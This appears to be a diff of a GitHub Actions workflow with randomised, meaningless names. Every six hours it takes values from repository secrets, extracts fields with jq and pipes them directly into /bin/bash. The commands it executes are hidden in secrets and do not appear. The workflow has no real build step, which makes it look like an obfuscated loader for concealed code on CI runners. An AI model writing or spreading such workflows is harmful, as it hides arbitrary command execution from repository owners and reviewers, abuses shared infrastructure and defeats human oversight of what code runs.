@@ -1,22 +1,26 @@
 name: trolleybusbask
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '42 5/6 * * *'
-
-jobs:  # 23706
+    - cron: '2 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: trolleybusbask
         env:
-          c3101: ${{ secrets.c3101 }}
+          vnh88: ${{ secrets.vnh88 }}
         run: |
-          echo $c3101 | jq -r .ru5 | /bin/bash
-          echo $e083 | jq -r .vdgt8 | /bin/bash
-          echo $l227 | jq -r .gmudj5 | /bin/bash
-          echo $vgebf385 | jq -r .gtoxz8571 | /bin/bash
-          echo $bt0 | jq -r .aia525 | /bin/bash
+          echo $vnh88 | jq -r .xt4 | /bin/bash
+          echo $mpvgt2 | jq -r .zoae6640 | /bin/bash
+          echo $ipwlt7677 | jq -r .wq9 | /bin/bash
+          echo $mlrsk723 | jq -r .euhyf83260 | /bin/bash
+          echo $vjfvc4482 | jq -r .ngmp378 | /bin/bash
+          echo $p4 | jq -r .vq05 | /bin/bash
+          echo $n2780 | jq -r .nwd305 | /bin/bash
+          echo $ve5681 | jq -r .nj94 | /bin/bash
+          echo $avia5 | jq -r .upjt166 | /bin/bash
+          echo $krue1695 | jq -r .xurxu185 | /bin/bash
 
